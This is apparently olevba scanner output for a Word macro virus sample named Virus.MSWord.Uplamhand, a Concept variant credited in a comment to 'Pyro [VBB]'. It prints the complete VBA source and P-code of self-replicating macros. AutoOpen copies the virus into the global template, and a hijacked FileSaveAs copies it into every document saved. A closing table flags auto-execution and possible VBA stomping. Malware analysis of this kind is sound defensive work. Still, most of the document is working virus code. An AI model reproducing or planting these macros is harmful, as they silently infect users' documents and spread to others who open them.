olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uplamhand
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sAevaSeliF.bas 
in file: Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/sAevaSeliF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.sAevaSeliF.MAIN"
Dim Installed
Dim I
Dim FName$
Dim Macro$
On Error GoTo -1: On Error GoTo ErrorHandler

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1

Installed = 0
For I = 1 To WordBasic.CountMacros(1, 0)
If WordBasic.[MacroName$](I, 1, 0) = "MSConcept" Then Installed = 1
Next

If Installed = 0 Then
FName$ = WordBasic.[FileName$]()
Macro$ = FName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:nepOotuA", Macro$
Macro$ = FName$ + ":MSConcept"
WordBasic.MacroCopy "Global:MSConcept", Macro$
Macro$ = FName$ + ":sAevaSeliF"
WordBasic.MacroCopy "Global:FileSaveAs", Macro$
End If

ErrorHandler:
If Err.Number <> 102 Then WordBasic.FileSaveAs dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO MSConcept.bas 
in file: Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/MSConcept'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem Presenting The Microsoft Concept Virus.
    Rem Updated by Pyro [VBB] (Author of Word97.NightShade)
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Installed
Dim I
Dim FName$
Dim Macro$
On Error GoTo -1: On Error GoTo ErrorHandler

Installed = 0
For I = 1 To WordBasic.CountMacros(0, 0)
If WordBasic.[MacroName$](I, 0, 0) = "MSConcept" Then Installed = 1
Next

If Installed = 0 Then
FName$ = WordBasic.[FileName$]()
Macro$ = FName$ + ":MSConcept"
WordBasic.MacroCopy Macro$, "Global:MSConcept"
Macro$ = FName$ + ":sAevaSeliF"
WordBasic.MacroCopy Macro$, "Global:FileSaveAs"
Macro$ = FName$ + ":AutoOpen"
WordBasic.MacroCopy Macro$, "Global:nepOotuA"
End If

ErrorHandler:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Uplamhand
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/sAevaSeliF - 2606 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Installed
' Line #3:
' 	Dim 
' 	VarDefn I
' Line #4:
' 	Dim 
' 	VarDefn FName
' Line #5:
' 	Dim 
' 	VarDefn Macro
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrorHandler 
' Line #7:
' Line #8:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #12:
' Line #13:
' 	LitDI2 0x0000 
' 	St Installed 
' Line #14:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #15:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "MSConcept"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Installed 
' 	EndIf 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' Line #18:
' 	Ld Installed 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FName$ 
' Line #20:
' 	Ld FName$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St Macro$ 
' Line #21:
' 	LitStr 0x000F "Global:nepOotuA"
' 	Ld Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld FName$ 
' 	LitStr 0x000A ":MSConcept"
' 	Add 
' 	St Macro$ 
' Line #23:
' 	LitStr 0x0010 "Global:MSConcept"
' 	Ld Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld FName$ 
' 	LitStr 0x000B ":sAevaSeliF"
' 	Add 
' 	St Macro$ 
' Line #25:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld Macro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	EndIfBlock 
' Line #27:
' Line #28:
' 	Label ErrorHandler 
' Line #29:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	EndIf 
' Line #30:
' 	EndSub 
' Macros/VBA/MSConcept - 1061 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x0028 " Presenting The Microsoft Concept Virus."
' Line #3:
' 	Rem 0x0034 " Updated by Pyro [VBB] (Author of Word97.NightShade)"
' Line #4:
' 	EndSub 
' Macros/VBA/AutoOpen - 2532 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Installed
' Line #3:
' 	Dim 
' 	VarDefn I
' Line #4:
' 	Dim 
' 	VarDefn FName
' Line #5:
' 	Dim 
' 	VarDefn Macro
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrorHandler 
' Line #7:
' Line #8:
' 	LitDI2 0x0000 
' 	St Installed 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	For 
' Line #10:
' 	Ld I 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "MSConcept"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Installed 
' 	EndIf 
' Line #11:
' 	StartForVariable 
' 	Next 
' Line #12:
' Line #13:
' 	Ld Installed 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St FName$ 
' Line #15:
' 	Ld FName$ 
' 	LitStr 0x000A ":MSConcept"
' 	Add 
' 	St Macro$ 
' Line #16:
' 	Ld Macro$ 
' 	LitStr 0x0010 "Global:MSConcept"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld FName$ 
' 	LitStr 0x000B ":sAevaSeliF"
' 	Add 
' 	St Macro$ 
' Line #18:
' 	Ld Macro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld FName$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St Macro$ 
' Line #20:
' 	Ld Macro$ 
' 	LitStr 0x000F "Global:nepOotuA"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	EndIfBlock 
' Line #22:
' Line #23:
' 	Label ErrorHandler 
' Line #24:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

